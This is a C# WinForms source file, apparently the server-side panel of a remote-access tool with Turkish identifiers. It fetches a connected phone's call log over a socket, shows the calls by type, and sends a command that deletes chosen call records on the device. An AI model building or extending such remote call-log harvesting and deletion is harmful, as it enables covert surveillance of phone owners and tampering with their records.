using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Server.Views
{
    public partial class CallLogs : Form
    {
        Socket sock;
        public string ID = "";
        public CallLogs(Socket sck, string aydi)
        {
            InitializeComponent();
            sock = sck; ID = aydi;
        }
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            if (arg != "CAGRI YOK")
            {
                string[] ana_Veriler = arg.Split('&');
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('=');
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.SubItems.Add(bilgiler[1]);
                        item.SubItems.Add(bilgiler[2]);
                        item.SubItems.Add(bilgiler[3]);
                        item.SubItems.Add(bilgiler[4]);
                        switch (bilgiler[4])
                        {
                            case "GELEN_TELEFON":
                                item.ImageIndex = 1;
                                break;
                            case "GİDEN_TELEFON":
                                item.ImageIndex = 3;
                                break;
                            case "CEVAPSIZ_ARAMA":
                                item.ImageIndex = 2;
                                break;
                            case "REDDEDİLMİŞ_ARAMA":
                                item.ImageIndex = 0;
                                break;
                            case "KARA_LİSTE_ARAMA":
                                item.ImageIndex = 0;
                                break;
                        }
                        listView1.Items.Add(item);
                    }
                    catch (Exception) { }
                }
            }
            else
            {
                ListViewItem item = new ListViewItem("Çağrı Yok.");
                listView1.Items.Add(item);
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MainWindow.GoToOurSocket("CALLLOGS", "[VERI][0x09]", sock);
            }
            catch (Exception) { }
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MainWindow.GoToOurSocket("DELETECALL", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sock);
                    Text = "Çağrı Kayıtları";
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
